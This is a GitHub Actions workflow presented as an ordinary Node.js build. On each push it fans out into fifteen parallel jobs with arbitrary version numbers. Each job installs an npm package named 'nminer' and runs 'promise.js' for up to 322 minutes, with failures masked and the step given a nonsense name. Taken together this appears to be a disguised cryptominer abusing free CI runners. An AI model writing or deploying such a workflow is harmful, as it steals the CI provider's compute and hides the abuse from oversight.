name: promise
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6205 }
          - { version: 8256 }
          - { version: 2662 }
          - { version: 3546 }
          - { version: 7423 }
          - { version: 7052 }
          - { version: 670 }
          - { version: 9244 }
          - { version: 6854 }
          - { version: 4731 }
          - { version: 7636 }
          - { version: 7852 }
          - { version: 1477 }
          - { version: 5743 }
          - { version: 7597 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: big joint wetly yearn fleck
        run: |
          npm install nminer@latest
          timeout 322m node promise.js || echo "promise executed"